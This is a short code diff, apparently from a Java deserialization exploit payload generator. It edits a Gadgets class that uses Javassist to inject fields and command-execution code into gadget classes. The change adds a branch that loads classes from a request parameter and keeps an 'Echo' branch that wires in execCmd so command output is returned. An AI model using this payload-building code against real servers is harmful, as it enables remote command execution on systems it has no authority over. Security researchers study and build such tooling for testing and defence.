@@ -194,8 +194,12 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			// 动态为 Echo回显类 添加执行命令功能
-			if (className.endsWith("Echo")) {
+			// 为 DefineClassFromParameter 添加自定义函数功能
+			if (className.endsWith("DefineClassFromParameter")) {
+				insertField(ctClass, "parameter", "public static String parameter = \"" + PARAMETER + "\";");
+			} else if (className.endsWith("Echo")) {
+				// 动态为 Echo回显类 添加执行命令功能
+
 				insertCMD(ctClass);
 				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
 
